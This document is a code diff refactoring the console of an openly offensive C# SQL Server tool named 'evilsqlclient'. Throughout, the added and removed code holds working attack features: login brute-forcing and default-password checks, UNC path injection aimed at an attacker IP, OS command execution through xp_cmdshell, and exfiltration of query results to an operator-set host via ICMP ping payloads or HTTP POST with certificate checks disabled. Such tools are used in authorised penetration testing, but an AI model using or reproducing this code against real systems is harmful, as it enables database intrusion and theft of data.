-                            Console.Write("\nValid settings include enabled or disabled.\n");
-                        }
-                        Console.Write("\nSQLCLIENT> ");
+                        IcmpStateG = MyQuery.EnableDisable("set icmp ");
+                        Console.WriteLine($"\nExfiltrating query results via ICMP has been {(IcmpStateG ? "enabled\nDon't forget to configure the ICMPIP setting." : "disabled")} ");
                     }
-
-                    // ICMP EXFILTRATION: SET IP
-                    bool ipCheck = MyQuery.ToLower().Contains("set icmpip ");
-                    if (ipCheck)
+                    else if (multiline = MyQuery.Check("set icmpip "))
                     {
-                        string targetip = MyQuery.ToLower().Replace("set icmpip ", "");
-                        IcmpIpG = targetip;
-                        Console.Write("\nICMP IP set to " + targetip + ".\n");
-                        Console.Write("\nSQLCLIENT> ");
+                        IcmpIpG = MyQuery.ToLower().Replace("set icmpip ", string.Empty); ;
+                        Console.WriteLine($"\nICMP IP set to {IcmpIpG}.");
                     }
-
-                    // HTTP EXFILTRATION: ENABLE/DISABLE
-                    bool httpenabledCheck = MyQuery.ToLower().Contains("set http ");
-                    if (httpenabledCheck)
+                    else if (multiline = MyQuery.Check("set http "))
                     {
-                        string HttpState = MyQuery.ToLower().Replace("set http ", "");
-                        if ((HttpState.Equals("enabled")) || (HttpState.Equals("disabled")))
-                        {
-                            HttpStateG = HttpState;
-                            Console.Write("\nExfiltrating query results via HTTP POST has been " + HttpState + ".\n");
-                            Console.Write("Don't forget to set the HTTPURL setting.\n");
-                        }
-                        else
-                        {
-                            Console.Write("\nValid settings include enabled or disabled.\n");
-                        }
-                        Console.Write("\nSQLCLIENT> ");
+                        HttpStateG = MyQuery.EnableDisable("set http ");
+                        Console.WriteLine($"\nExfiltrating query results via HTTP POST has been {(HttpStateG ? "enabled\nDon't forget to set the HTTPURL setting." : "disabled")} ");
                     }
-
-                    // HTTP EXFILTRATION: SET URL
-                    bool urlCheck = MyQuery.ToLower().Contains("set httpurl ");
-                    if (urlCheck)
+                    else if (multiline = MyQuery.Check("set httpurl "))
                     {
-                        string targeturl = MyQuery.ToLower().Replace("set httpurl ", "");
-                        HttpUrlG = targeturl;
-                        Console.Write("\nHTTP URL set to " + targeturl + ".\n");
-                        Console.Write("\nSQLCLIENT> ");
+                        HttpUrlG = MyQuery.ToLower().Replace("set httpurl ", string.Empty);
+                        Console.WriteLine($"\nHTTP URL set to {HttpUrlG}.");
                     }
-
                     #endregion
 
                     // ----------------------------------------------------
                     // DATA ENCRYPTION SETTINGS 
                     // ----------------------------------------------------
                     #region data encryption settings 
-
-                    // DATA ENCRYPTION: ENABLE/DISABLE
-                    bool encdisabledCheck = MyQuery.ToLower().Contains("set encryption ");
-                    if (encdisabledCheck)
+                    else if (multiline = MyQuery.Check("set encryption "))
                     {
-                        string encstate = MyQuery.Replace("set encryption ", "");
-                        if ((encstate.Equals("enabled")) || (encstate.Equals("disabled")))
-                        {
-                            EncStateG = encstate;
-                            Console.Write("\nData encryption has been " + encstate + ".\n");
-                            Console.Write("Don't forget update the key and salt.\n");
-                        }
-                        else
-                        {
-                            Console.Write("\nValid settings include enabled or disabled.\n");
-                        }
-                        Console.Write("\nSQLCLIENT> ");
+                        EncStateG = MyQuery.EnableDisable("set Encryption ");
+                        Console.WriteLine($"\nData encryption has been {(EncStateG ? "enabled\nDon't forget update the key and salt." : "disabled")} ");
                     }
-
-                    // DATA ENCRYPTION: SET KEY
-                    bool keyCheck = MyQuery.ToLower().Contains("set enckey ");
-                    if (keyCheck)
+                    else if (multiline = MyQuery.Check("set enckey "))
                     {
-                        string mykey = MyQuery.Replace("set enckey ", "");
-                        EncKeyG = mykey;
-                        Console.Write("\nEncryption key set to: " + mykey + "\n");
-                        Console.Write("\nSQLCLIENT> ");
+                        EncKeyG = MyQuery.Replace("set enckey ", string.Empty);
+                        Console.WriteLine($"\nEncryption key set to: {EncKeyG}");
                     }
-
-                    // DATA ENCRYPTION: SET SALT
-                    bool saltCheck = MyQuery.ToLower().Contains("set encsalt ");
-                    if (saltCheck)
+                    else if (multiline = MyQuery.Check("set encsalt "))
                     {
-                        string mysalt = MyQuery.Replace("set encsalt ", "");
-                        EncSaltG = mysalt;
-                        Console.Write("\nEncryption salt set to: " + mysalt + "\n");
-                        Console.Write("\nSQLCLIENT> ");
+                        EncSaltG = MyQuery.Replace("set encsalt ", string.Empty);
+                        Console.WriteLine($"\nEncryption salt set to: {EncSaltG}");
                     }
-
                     #endregion
 
                     // ----------------------------------------------------
                     // OFFENSIVE COMMANDS 
                     // ----------------------------------------------------
                     #region offensive commands 
-
-                    // CHECK ACCESS 
-                    bool CheckAccessBool = MyQuery.ToLower().Contains("check access");
-                    if (CheckAccessBool)
+                    else if (multiline = MyQuery.Check("check access"))
                     {
-                        // Call function
                         CheckAccess();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // CHECK DEFAULT PW FOR KNOWN INSTANCE NAMES
-                    bool CheckDefaultPwBool = MyQuery.ToLower().Contains("check defaultpw");
-                    if (CheckDefaultPwBool)
+                    else if (multiline = MyQuery.Check("check defaultpw"))
                     {
-                        // Call function
                         CheckDefaultAppPw();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST DATABASES
-                    bool CheckListDb = MyQuery.ToLower().Contains("list databases");
-                    if (CheckListDb)
+                    else if (multiline = MyQuery.Check("check bruteforce"))
                     {
-                        // Call function
+                        CheckLoginPwList();
+                    }
+                    else if (multiline = MyQuery.Check("list databases"))
+                    {
                         ListDatabase();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST TABLES
-                    bool CheckListTbl = MyQuery.ToLower().Contains("list tables");
-                    if (CheckListTbl)
+                    else if (multiline = MyQuery.Check("list tables"))
                     {
-                        // Call function
                         ListTable();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST SERVER INFORMATION
-                    bool CheckListServerInfo = MyQuery.ToLower().Contains("list serverinfo");
-                    if (CheckListServerInfo)
+                    else if (multiline = MyQuery.Check("list serverinfo"))
                     {
-                        // Call function
                         ListServerInfo();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST ROLE MEMBERS
-                    bool CheckRoleMember = MyQuery.ToLower().Contains("list rolemembers");
-                    if (CheckRoleMember)
+                    else if (multiline = MyQuery.Check("list rolemembers"))
                     {
-                        // Call function
                         ListRoleMembers();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST LINKS
-                    bool CheckListLink = MyQuery.ToLower().Contains("list links");
-                    if (CheckListLink)
+                    else if (multiline = MyQuery.Check("list links"))
                     {
-                        // Call function
                         ListLinks();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST LOGINS
-                    bool CheckListLogin = MyQuery.ToLower().Contains("list logins");
-                    if (CheckListLogin)
+                    else if (multiline = MyQuery.Check("list logins"))
                     {
-                        // Call function
                         ListLogins();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST PRIVS
-                    bool CheckListPrivs = MyQuery.ToLower().Contains("list privs");
-                    if (CheckListPrivs)
+                    else if (multiline = MyQuery.Check("list privs"))
                     {
-                        // Call function
                         ListPrivs();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // LIST LOGIN AS PASSWORD
-                    bool CheckLoginAsPwBool = MyQuery.ToLower().Contains("check loginaspw");
-                    if (CheckLoginAsPwBool)
+                    else if (multiline = MyQuery.Check("check loginaspw"))
                     {
-                        // Call function
                         CheckLoginAsPw();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // CHECK UNC PATH INJECTION
-                    bool CheckUnc = MyQuery.ToLower().Contains("check uncinject ");
-                    if (CheckUnc)
+                    else if (multiline = MyQuery.Check("check uncinject "))
                     {
-                        // Parse attacker IP
-                        string attackerip = MyQuery.Replace("check uncinject ", "");
-
-                        // Call function
-                        CheckUncPathInjection(attackerip);
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
+                        CheckUncPathInjection(MyQuery.Replace("check uncinject ", string.Empty));
                     }
-
-                    // RUN OSCMD via xp_cmdshell
-                    bool CheckOSCmd = MyQuery.ToLower().Contains("run oscmd ");
-                    if (CheckOSCmd)
+                    else if (multiline = MyQuery.Check("run oscmd "))
                     {
-                        //  Parse command
-                        string command = MyQuery.Replace("run oscmd ", "");
-
-                        // Call function
-                        RunOsCmd(command);
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
+                        RunOsCmd(MyQuery.Replace("run oscmd ", string.Empty));
                     }
-
                     #endregion
 
                     // ----------------------------------------------------
                     // MISC COMMANDS 
                     // ----------------------------------------------------
                     #region misc commands 
-
-                    // VERBOSE: ENABLE/DISABLE
-                    bool verboseCheck = MyQuery.ToLower().Contains("set verbose ");
-                    if (verboseCheck)
+                    else if (multiline = MyQuery.Check("set verbose"))
                     {
-                        string VerboseState = MyQuery.ToLower().Replace("set verbose ", "");
-                        if ((VerboseState.Equals("enabled")) || (VerboseState.Equals("disabled")))
-                        {
-                            VerboseG = VerboseState;
-                            Console.Write("\nVerbose errors messages have been " + VerboseState + ".\n");
-                        }
-                        else
-                        {
-                            Console.Write("\nValid settings include enabled or disabled.\n");
-                        }
-                        Console.Write("\nSQLCLIENT> ");
+                        VerboseG = MyQuery.EnableDisable("set verbose ");
+                        Console.Write($"\nVerbose errors messages have been {(VerboseG ? "enabled" : "disabled")}.\n");
                     }
-
-                    // CLEAR CONSOLE
-                    if (MyQuery.ToLower().Equals("clear"))
+                    else if (MyQuery.Check("clear"))
                     {
                         Console.Clear();
                         fullcommand = "";
                         Console.WriteLine("----------");
-                        Console.Write("SQLCLIENT> ");
                     }
-
-                    // SHOW SETTINGS 
-                    bool statusCheck = MyQuery.ToLower().Contains("show settings");
-                    if (statusCheck)
+                    else if (multiline = MyQuery.Check("show settings"))
                     {
                         fullcommand = "";
                         Console.WriteLine("\n------------------------------------");
@@ -3129,281 +3111,351 @@ namespace evilsqlclient
                         Console.WriteLine(" EncKey     : " + EncKeyG);
                         Console.WriteLine(" EncSalt    : " + EncSaltG);
                         Console.WriteLine("------------------------------------\n");
-                        Console.Write("SQLCLIENT> ");
+                        // Console.Write("SQLCLIENT> ");
                     }
-
-                    // SHOW HELP
-                    bool helpCheck = MyQuery.ToLower().Contains("help");
-                    if (MyQuery.ToLower().Equals("help") || MyQuery.ToLower().Equals("show help"))
+                    else if (multiline = (MyQuery.Check("help") || MyQuery.Check("show help")))
                     {
-
                         GetHelp();
                         fullcommand = "";
                         Console.WriteLine("----------");
-                        Console.Write("SQLCLIENT> ");
                     }
-
                     #endregion
-
-                    // Show multi-line input											
-                    if ((MyQuery.ToLower() != "clear") && (!CheckOSCmd) && (!CheckUnc) && (!CheckListServerInfo) && (!CheckRoleMember) && (!CheckListPrivs) && (!CheckLoginAsPwBool) && (!CheckListLogin) && (!CheckListLink) && (!CheckListTbl) && (!CheckListDb) && (!CheckDefaultPwBool) && (!clearaccessCheck) && (!exportaccessCheck) && (!showaccessCheck) && (!verboseCheck) && (!timeoutCheck) && (!CheckAccessBool) && (!passwordCheck) && (!fileCheck3) && (!cleardiscoCheck) && (!usernameCheck) && (!exportdiscoCheck) && (!instanceCheck) && (!instanceallCheck) && (!showdiscoCheck) && (!broadcastCheck) && (!fileCheck1) && (!spnCheck) && (!encdisabledCheck) && (!urlCheck) && (!keyCheck) && (!saltCheck) && (!ipCheck) && (!loadCheck) && (!fileCheck) && (!helpCheck) && (!httpenabledCheck) && (!icmpenabledCheck) && (!statusCheck))
+                    else
                     {
-                        Console.Write("         > ");
+                        multiline = false;
                     }
-
-                    // Collect additional query lines						
-                    MyQuery = Console.ReadLine().ToString();
                 }
+                while (MyQuery.ToLower() != "go");
 
                 // ------------------------------------------------------------
                 //  PERFORM QUERY - SINGLE INSTANCE AND TARGETALL SUPPORTED
                 // ------------------------------------------------------------
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (!ReadyforQueryG)
                 {
-                    // Create data table 
-                    IList<string> TargetList = new List<string>();
+                    Console.WriteLine("\nNo target instances have been defined.\n");
+                    return true;
+                }
 
+                // Create data table 
+                IList<string> TargetList = new List<string>();
+
+                // Add all
+                if (InstanceAllG)
+                {
                     // Add all
-                    if (InstanceAllG.Equals("enabled"))
+                    // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
+                    if (InstanceAllG)
                     {
-                        // Add all
-                        // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                        if (InstanceAllG.Equals("enabled"))
+                        foreach (DataRow CurrentRecord in MasterAccessList.Select())
                         {
-                            foreach (DataRow CurrentRecord in EvilCommands.MasterAccessList.Select())
-                            {
-                                TargetList.Add(CurrentRecord["Instance"].ToString());
-                            }
-                        }
-                    }
-
-                    // Add instance
-                    if (!InstanceG.Equals(""))
-                    {
-                        TargetList.Add(InstanceG);
-                    }
-
-                    // Get list count
-                    var count = TargetList.Count;
-                    Console.WriteLine("\n" + count + " instances will be targeted.\n");
-
-                    // Loop through target list 
-                    foreach (var instance in TargetList)
-                    {
-                        Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
-                        try
-                        {
-
-                            // ----------------------------
-                            // Setup connection string
-                            // ----------------------------
-                            string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
-
-                            // ----------------------------
-                            // Execute query	
-                            // ----------------------------							
-                            SqlConnection conn = new SqlConnection(ConnectionString);
-                            SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
-                            conn.Open();
-
-                            // Execute query and read data into data table
-                            DataTable dt = new DataTable();
-                            SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
-                            da.Fill(dt);
-
-                            // Display results 	
-                            DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
-                            if (currentRows.Length < 1)
-                            {
-                                Console.WriteLine("\nNo rows returned.\n");
-                            }
-                            else
-                            {
-                                Console.WriteLine("\nQUERY RESULTS:\n");
-
-                                foreach (DataColumn column in dt.Columns)
-                                {
-                                    Console.Write("\t{0}", column.ColumnName);
-                                }
-
-                                Console.WriteLine("\t");
-
-                                foreach (DataRow row in currentRows)
-                                {
-                                    foreach (DataColumn column in dt.Columns)
-                                    {
-                                        Console.Write("\t{0}", row[column]);
-                                    }
-
-                                    Console.WriteLine("\t");
-                                }
-                                Console.WriteLine("\t");
-                            }
-
-                            // ----------------------------
-                            // Encrypt data
-                            // ----------------------------
-                            if (EncStateG.Equals("enabled"))
-                            {
-                                Console.WriteLine("\nEncrypting data.");
-                                // encrypt exfil encryption
-                                //string enableEncryption = "false";
-                                //string mySharedSecret = "changethis";
-                                //string encrypted64 = EncryptStringAES(fileContent.ToString(), EncKeyG);	
-                            }
-
-                            // ----------------------------
-                            // Exfiltrate data to file
-                            // ----------------------------
-                            if (ExportFileStateG.Equals("enabled"))
-                            {
-                                StringBuilder fileContent = new StringBuilder();
-
-                                foreach (var col in dt.Columns)
-                                {
-                                    fileContent.Append(col.ToString() + ",");
-                                }
-
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                foreach (DataRow dr in dt.Rows)
-                                {
-                                    foreach (var column in dr.ItemArray)
-                                    {
-                                        fileContent.Append("\"" + column.ToString() + "\",");
-                                    }
-
-                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                }
-
-                                try
-                                {
-                                    // write file output
-                                    System.IO.File.AppendAllText(ExportFilePathG, fileContent.ToString());
-                                    Console.WriteLine("\nSuccessfully wrote file to " + ExportFilePathG + "\n");
-                                }
-                                catch
-                                {
-                                    Console.WriteLine("\nUnable to write file.\n");
-                                }
-                            }
-
-                            // ----------------------------
-                            // Exfiltrate data to icmp
-                            // ----------------------------
-                            if (IcmpStateG.Equals("enabled"))
-                            {
-                                Console.WriteLine("Exfiltrating results via ICMP to: " + IcmpIpG + "\n");
-
-                                // Create content to send
-                                StringBuilder fileContent = new StringBuilder();
-
-                                foreach (var col in dt.Columns)
-                                {
-                                    fileContent.Append(col.ToString() + ",");
-                                }
-
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                foreach (DataRow dr in dt.Rows)
-                                {
-                                    foreach (var column in dr.ItemArray)
-                                    {
-                                        fileContent.Append("\"" + column.ToString() + "\",");
-                                    }
-
-                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                }
-
-
-                                // Create string to be sent in ICMP payload
-                                string data = fileContent.ToString();
-
-                                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
-                                Ping pingSender = new Ping();
-                                PingOptions options = new PingOptions();
-
-                                // Use the default Ttl value which is 128, but change the fragmentation behavior.
-                                int timeout = 120;
-                                options.DontFragment = true;
-
-                                // Create a buffer of data to be transmitted.
-                                byte[] buffer = Encoding.ASCII.GetBytes(data);
-                                PingReply reply = pingSender.Send(IcmpIpG, timeout, buffer, options);
-                                Console.WriteLine("ICMP exfiltration is complete.\n");
-                            }
-
-                            // ----------------------------
-                            // Exfiltrate data to http post
-                            // ----------------------------
-                            if (HttpStateG.Equals("enabled"))
-                            {
-                                Console.WriteLine("Exfiltrating results to URL: " + HttpUrlG + "\n");
-
-                                // Create content to send
-                                StringBuilder fileContent = new StringBuilder();
-
-                                foreach (var col in dt.Columns)
-                                {
-                                    fileContent.Append(col.ToString() + ",");
-                                }
-
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                foreach (DataRow dr in dt.Rows)
-                                {
-                                    foreach (var column in dr.ItemArray)
-                                    {
-                                        fileContent.Append("\"" + column.ToString() + "\",");
-                                    }
-
-                                    fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                                }
-
-                                // Create string to be sent in ICMP payload
-                                string mydata = fileContent.ToString();
-                                byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);
-
-                                try
-                                {
-                                    // Trust all SSL certs
-                                    ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
-
-                                    // Turn on TLS 1.1 and 1.2 without affecting other protocols:
-                                    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
-
-                                    // Create webclient and send payload 																							
-                                    WebClient myWebClient1 = new WebClient();
-                                    myWebClient1.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                                    byte[] responseArray1 = myWebClient1.UploadData(HttpUrlG, "POST", postArray1);
-                                    //Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
-                                }
-                                catch
-                                {
-                                    // catch(System.Net.WebException ex1)
-                                    // Console.WriteLine("HTTP POST FAILED: " + ex1.Message + "\n");									
-                                }
-
-                                Console.WriteLine("Exfiltration complete.\n");
-                            }
-
-                        }
-                        catch (SqlException ex)
-                        {
-                            Console.WriteLine(instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
-                            {
-                                Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
-                            }
+                            TargetList.Add(CurrentRecord["Instance"].ToString());
                         }
                     }
                 }
-                else
+
+                // Add instance
+                if (!string.IsNullOrEmpty(InstanceG))
                 {
-                    Console.WriteLine("\nNo target instances have been defined.\n");
+                    TargetList.Add(InstanceG);
+                }
+
+                // Get list count
+                var count = TargetList.Count;
+                Console.WriteLine("\n" + count + " instances will be targeted.\n");
+
+                // Loop through target list 
+                foreach (var instance in TargetList)
+                {
+                    Console.WriteLine("\n" + instance + ": ATTEMPTING QUERY");
+                    try
+                    {
+                        // ----------------------------
+                        // Setup connection string
+                        // ----------------------------
+                        string ConnectionString = CreateConnectionString(instance, UsernameG, PasswordG, UsertypeG, "master");
+
+                        // ----------------------------
+                        // Execute query	
+                        // ----------------------------							
+                        SqlConnection conn = new SqlConnection(ConnectionString);
+                        SqlCommand QueryCommand = new SqlCommand(fullcommand, conn);
+                        conn.Open();
+
+                        // Execute query and read data into data table
+                        DataTable dt = new DataTable();
+                        SqlDataAdapter da = new SqlDataAdapter(QueryCommand);
+                        da.Fill(dt);
+
+                        // Display results 	
+                        DataRow[] currentRows = dt.Select(null, null, DataViewRowState.CurrentRows);
+                        if (currentRows.Length < 1)
+                        {
+                            Console.WriteLine("\nNo rows returned.\n");
+                        }
+                        else
+                        {
+                            Console.WriteLine("\nQUERY RESULTS:\n");
+
+                            foreach (DataColumn column in dt.Columns)
+                            {
+                                Console.Write("\t{0}", column.ColumnName);
+                            }
+
+                            Console.WriteLine("\t");
+
+                            foreach (DataRow row in currentRows)
+                            {
+                                foreach (DataColumn column in dt.Columns)
+                                {
+                                    Console.Write("\t{0}", row[column]);
+                                }
+
+                                Console.WriteLine("\t");
+                            }
+                            Console.WriteLine("\t");
+                        }
+
+                        // ----------------------------
+                        // Encrypt data
+                        // ----------------------------
+                        if (EncStateG)
+                        {
+                            Console.WriteLine("\nEncrypting data.");
+                            // encrypt exfil encryption
+                            //string enableEncryption = "false";
+                            //string mySharedSecret = "changethis";
+                            //string encrypted64 = EncryptStringAES(fileContent.ToString(), EncKeyG);	
+                        }
+
+                        // ----------------------------
+                        // Exfiltrate data to file
+                        // ----------------------------
+                        if (ExportFileStateG)
+                        {
+                            StringBuilder fileContent = new StringBuilder();
+
+                            foreach (var col in dt.Columns)
+                            {
+                                fileContent.Append(col.ToString() + ",");
+                            }
+
+                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            foreach (DataRow dr in dt.Rows)
+                            {
+                                foreach (var column in dr.ItemArray)
+                                {
+                                    fileContent.Append("\"" + column.ToString() + "\",");
+                                }
+
+                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            }
+
+                            try
+                            {
+                                // write file output
+                                File.AppendAllText(ExportFilePathG, fileContent.ToString());
+                                Console.WriteLine("\nSuccessfully wrote file to " + ExportFilePathG + "\n");
+                            }
+                            catch
+                            {
+                                Console.WriteLine("\nUnable to write file.\n");
+                            }
+                        }
+
+                        // ----------------------------
+                        // Exfiltrate data to icmp
+                        // ----------------------------
+                        if (IcmpStateG)
+                        {
+                            Console.WriteLine("Exfiltrating results via ICMP to: " + IcmpIpG + "\n");
+
+                            // Create content to send
+                            StringBuilder fileContent = new StringBuilder();
+
+                            foreach (var col in dt.Columns)
+                            {
+                                fileContent.Append(col.ToString() + ",");
+                            }
+
+                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+                            foreach (DataRow dr in dt.Rows)
+                            {
+                                foreach (var column in dr.ItemArray)
+                                {
+                                    fileContent.Append("\"" + column.ToString() + "\",");
+                                }
+
+                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+                            }
+
+
+                            // Create string to be sent in ICMP payload
+                            string data = fileContent.ToString();
+
+                            // Source: https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
+                            Ping pingSender = new Ping();
+                            PingOptions options = new PingOptions();
+
+                            // Use the default Ttl value which is 128, but change the fragmentation behavior.
+                            int timeout = 120;
+                            options.DontFragment = true;
+
+                            // Create a buffer of data to be transmitted.
+                            byte[] buffer = Encoding.ASCII.GetBytes(data);
+                            PingReply reply = pingSender.Send(IcmpIpG, timeout, buffer, options);
+                            Console.WriteLine("ICMP exfiltration is complete.\n");
+                        }
+
+                        // ----------------------------
+                        // Exfiltrate data to http post
+                        // ----------------------------
+                        if (HttpStateG)
+                        {
+                            Console.WriteLine("Exfiltrating results to URL: " + HttpUrlG + "\n");
+
+                            // Create content to send
+                            StringBuilder fileContent = new StringBuilder();
+
+                            foreach (var col in dt.Columns)
+                            {
+                                fileContent.Append(col.ToString() + ",");
+                            }
+
+                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            foreach (DataRow dr in dt.Rows)
+                            {
+                                foreach (var column in dr.ItemArray)
+                                {
+                                    fileContent.Append("\"" + column.ToString() + "\",");
+                                }
+
+                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                            }
+
+                            // Create string to be sent in ICMP payload
+                            string mydata = fileContent.ToString();
+                            byte[] postArray1 = Encoding.ASCII.GetBytes(mydata);
+
+                            try
+                            {
+                                // Trust all SSL certs
+                                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+
+                                // Turn on TLS 1.1 and 1.2 without affecting other protocols:
+                                ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+
+                                // Create webclient and send payload 																							
+                                WebClient myWebClient1 = new WebClient();
+                                myWebClient1.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
+                                byte[] responseArray1 = myWebClient1.UploadData(HttpUrlG, "POST", postArray1);
+                                //Console.WriteLine("\nResponse received was :{0}", Encoding.ASCII.GetString(responseArray1));		
+                            }
+                            catch
+                            {
+                                // catch(System.Net.WebException ex1)
+                                // Console.WriteLine("HTTP POST FAILED: " + ex1.Message + "\n");									
+                            }
+
+                            Console.WriteLine("Exfiltration complete.\n");
+                        }
+
+                    }
+                    catch (SqlException ex)
+                    {
+                        Console.WriteLine(instance + ": CONNECTION OR QUERY FAILED");
+                        if (VerboseG)
+                        {
+                            Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
+                        }
+                    }
                 }
 
                 // Return to console 
-                EvilCommands.RunSQLConsole();
-                return null;
+                // RunSQLConsole();
+                return true;
+            }
+        }
+
+        private enum UserType
+        {
+            CurrentWindowsUser = 1,
+            WindowsDomainUser = 2,
+            SqlLogin = 3
+        }
+
+        private sealed class AccessInfo
+        {
+            public string Instance { get; set; }
+            public string DomainName { get; set; }
+            public uint ServiceProcessID { get; set; }
+            public string ServiceName { get; set; }
+            public string ServiceAccount { get; set; }
+            public string AuthenticationMode { get; set; }
+            public bool ForcedEncryption { get; set; }
+            public bool Clustered { get; set; }
+            public string SQLServerMajorVersion { get; set; }
+            public string SQLServerVersionNumber { get; set; }
+            public string SQLServerEdition { get; set; }
+            public string SQLServerServicePack { get; set; }
+            public string OSArchitecture { get; set; }
+            public string OsVersionNumber { get; set; }
+            public string CurrentLogin { get; set; }
+            public bool IsSysadmin { get; set; }
+            public string CurrentLoginPassword { get; set; }
+
+            public AccessInfo(DataRow currentRecord)
+            {
+                Instance = currentRecord["Instance"].ToString();
+                DomainName = currentRecord["DomainName"].ToString();
+                if (uint.TryParse(currentRecord["ServiceProcessID"].ToString(), out uint serviceProcessID))
+                {
+                    ServiceProcessID = serviceProcessID;
+                }
+                ServiceName = currentRecord["ServiceName"].ToString();
+                ServiceAccount = currentRecord["ServiceAccount"].ToString();
+                AuthenticationMode = currentRecord["AuthenticationMode"].ToString();
+                ForcedEncryption = Convert.ToBoolean((int)currentRecord["ForcedEncryption"]);
+                if (bool.TryParse(currentRecord["Clustered"].ToString(), out bool clustered))
+                {
+                    Clustered = clustered;
+                }
+                SQLServerMajorVersion = currentRecord["SQLServerMajorVersion"].ToString();
+                SQLServerVersionNumber = currentRecord["SQLServerVersionNumber"].ToString();
+                SQLServerEdition = currentRecord["SQLServerEdition"].ToString();
+                SQLServerServicePack = currentRecord["SQLServerServicePack"].ToString();
+                OSArchitecture = currentRecord["OSArchitecture"].ToString();
+                OsVersionNumber = currentRecord["OsVersionNumber"].ToString();
+                CurrentLogin = currentRecord["CurrentLogin"].ToString();
+                IsSysadmin = Convert.ToBoolean((int)currentRecord["IsSysadmin"]);
+            }
+        }
+    }
+
+    public static class StringExtention
+    {
+        public static bool Check(this string source, string toCheck)
+        {
+            return source?.IndexOf(toCheck, StringComparison.OrdinalIgnoreCase) >= 0;
+        }
+
+        public static bool EnableDisable(this string source, string toCheck)
+        {
+            try
+            {
+                return source.ToLower().Replace(toCheck, string.Empty) switch
+                {
+                    "enabled" => true,
+                    "true" => true,
+                    "disabled" => false,
+                    "false" => false,
+                    _ => throw new Exception("Invalid Setting Specified")
+                };
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return false;
             }
         }
     }
